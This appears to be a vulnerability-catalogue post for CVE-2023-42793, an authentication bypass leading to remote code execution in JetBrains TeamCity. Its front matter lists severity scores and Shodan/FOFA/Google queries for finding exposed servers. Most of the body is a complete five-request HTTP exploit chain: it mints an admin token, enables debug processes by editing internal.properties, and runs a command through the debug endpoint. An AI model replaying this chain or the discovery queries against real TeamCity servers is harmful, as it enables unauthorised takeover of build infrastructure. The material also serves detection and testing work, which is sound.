---
layout: "post"
cve_id: "CVE-2023-42793"
title: "JetBrains TeamCity < 2023.05.4 - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-42793.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-42793.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "critical"
reference:
  - "https://www.jetbrains.com/privacy-security/issues-fixed/"
  - "https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis"
  - "https://www.sonarsource.com/blog/teamcity-vulnerability"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-42793"
  - "https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2023-42793"
  cwe-id: "CWE-288"
  epss-score: 0.92913
  epss-percentile: 0.99759
  cpe: "cpe:2.3:a:jetbrains:teamcity:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 5
  vendor: "jetbrains"
  product: "teamcity"
  shodan-query: ['title:TeamCity', 'http.title:teamcity', 'http.component:"teamcity"']
  fofa-query: ['title=TeamCity', 'title=teamcity']
  google-query: "intitle:teamcity"
tags:
  - "cve2023"
  - "cve"
  - "jetbrains"
  - "teamcity"
  - "rce"
  - "auth-bypass"
  - "intrusive"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
In JetBrains TeamCity before 2023.05.4 authentication bypass leading to RCE on TeamCity Server was possible


## ðŸŒ HTTP Request
```nohighlight
DELETE /app/rest/users/id:1/tokens/RPC2 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

```nohighlight
POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Content-Length: 0
Accept-Encoding: gzip
```

```nohighlight
POST /admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Connection: close
Content-Length: 0
Authorization: Bearer vJKxG2e46E7TJIhwhHOg
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

```nohighlight
POST /admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0
Connection: close
Content-Length: 0
Authorization: Bearer vJKxG2e46E7TJIhwhHOg
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

```nohighlight
POST /app/rest/debug/processes?exePath=echo&params=36h1kpHYql4E90ZDx1azWFCDd1k HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Connection: close
Content-Length: 0
Authorization: Bearer vJKxG2e46E7TJIhwhHOg
Accept-Encoding: gzip
```


